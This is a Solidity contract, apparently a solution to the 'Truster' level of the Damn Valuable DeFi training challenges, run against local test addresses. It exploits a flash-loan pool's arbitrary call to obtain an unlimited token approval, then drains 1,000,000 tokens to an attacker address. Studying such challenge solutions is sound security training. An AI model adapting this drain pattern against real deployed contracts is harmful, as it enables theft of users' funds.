// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

contract TrusterAttacker {
    ITrusterLenderPool pool =
        ITrusterLenderPool(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    IDamnValuableToken token =
        IDamnValuableToken(0x5FbDB2315678afecb367f032d93F642f64180aa3);

    // Get the flash loan, and make the pool contract call token.approve() to
    // approve this contract to spend type(uint256).max tokens for the pool
    // contract
    function exploit() public {
        address attacker = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                type(uint256).max
            )
        );

        // Transfer all the tokens from the pool to the contract, then to the
        // attacker
        token.transferFrom(address(pool), address(this), 1000000 ether);
        token.transfer(attacker, 1000000 ether);
    }
}
